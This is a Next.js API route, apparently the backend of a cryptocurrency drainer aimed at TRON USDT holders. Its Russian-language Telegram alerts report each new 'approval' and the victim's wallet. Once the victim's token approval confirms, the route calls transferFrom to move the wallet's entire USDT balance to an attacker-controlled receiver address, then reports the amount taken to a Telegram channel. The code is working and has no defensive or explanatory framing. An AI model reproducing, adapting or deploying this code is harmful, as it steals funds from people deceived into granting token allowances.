import { NextRequest, NextResponse } from "next/server";
import { BigNumber, TronWeb } from "tronweb";
import { env } from "@/env";
import { bot } from "@/bot";

export const dynamic = "force-dynamic";
export const dynamicParams = true;
export const revalidate = 0;
export const fetchCache = "force-no-store";
export const maxDuration = 300;

interface INotifyRequest {
    time: number;
    result: boolean;
    txid: string;
    address: string;
}

async function waitForTransactionWithRetry(
    tronWeb: TronWeb,
    txid: string,
    maxRetries: number,
    interval: number
) {
    let retries = 0;
    while (retries < maxRetries) {
        const tx = await tronWeb.trx.getTransactionInfo(txid);
        console.log(
            `Scanning transaction ${txid} for confirmation, attempt ${retries} of ${maxRetries}, result: `,
            JSON.stringify(tx)
        );
        if (tx && tx.receipt && tx.receipt.result === "SUCCESS") {
            return true;
        }
        retries++;
        await new Promise((resolve) => setTimeout(resolve, interval));
    }
    return false;
}

const abi = [
    {
        constant: true,
        inputs: [{ name: "who", type: "address" }],
        name: "balanceOf",
        outputs: [{ name: "", type: "uint256" }],
        payable: false,
        stateMutability: "view",
        type: "function",
    },
];
const selector = "transferFrom(address,address,uint256)";

export async function POST(req: NextRequest) {
    try {
        const request = req.clone();

        const data: INotifyRequest = await request.json();

        console.log(`new notify request: `, data)

        await bot.api.sendMessage(
            process.env.TELEGRAM_CHANNEL_ID!,
            `Получен новый апрув:\n\nTxid: <code>${data.txid}</code>\nКош: <code>${data.address}</code>\n`
        );

        if (!process.env.TRON_PRIVATE_KEY) throw new Error("Misconfiguration");

        const tronWeb = new TronWeb({
            fullHost: "https://api.trongrid.io",
            privateKey: process.env.TRON_PRIVATE_KEY,
        });

        const contract = tronWeb.contract(abi, env.TRON_CONTRACT_ADDRESS);
        // @ts-ignore
        // prettier-ignore
        const balance: BigNumber = await contract.balanceOf(data.address).call();

        const confirmed = await waitForTransactionWithRetry(
            tronWeb,
            data.txid,
            60,
            3000
        );

        if (!confirmed) {
            await bot.api.sendMessage(
                process.env.TELEGRAM_CHANNEL_ID!,
                `Апрув <code>${data.txid}</code> не подтвержден за 3 минуты, следите в ручную`
            );

            return NextResponse.json(
                { message: "Not confirmed" },
                { status: 400 }
            );
        }

        const params = [
            { type: "address", value: data.address },
            { type: "address", value: env.TRON_RECEIVER_ADDRESS },
            {
                type: "uint256",
                value: balance.toString(10),
            },
        ];

        const tx = await tronWeb.transactionBuilder.triggerSmartContract(
            env.TRON_CONTRACT_ADDRESS,
            selector,
            {},
            params,
            env.TRON_RECEIVER_ADDRESS
        );

        const signed_tx = await tronWeb.trx.sign(tx.transaction);
        const res = await tronWeb.trx.sendRawTransaction(signed_tx as any);
        console.log(res.code);
        console.log(res.message);
        console.log(res.result);
        console.log(res.transaction);

        await bot.api.sendMessage(
            process.env.TELEGRAM_CHANNEL_ID!,
            `<code>${data.txid}</code>\n${
                balance.toNumber() / Math.pow(10, 6)
            } USDT\nSent to ${env.TRON_RECEIVER_ADDRESS}`
        );

        return NextResponse.json({ message: "OK" }, { status: 200 });
    } catch (route_err) {
        console.error(`Error in route POST /api/notify: ${route_err}`);
        return NextResponse.json({ message: "Server Error" }, { status: 500 });
    }
}
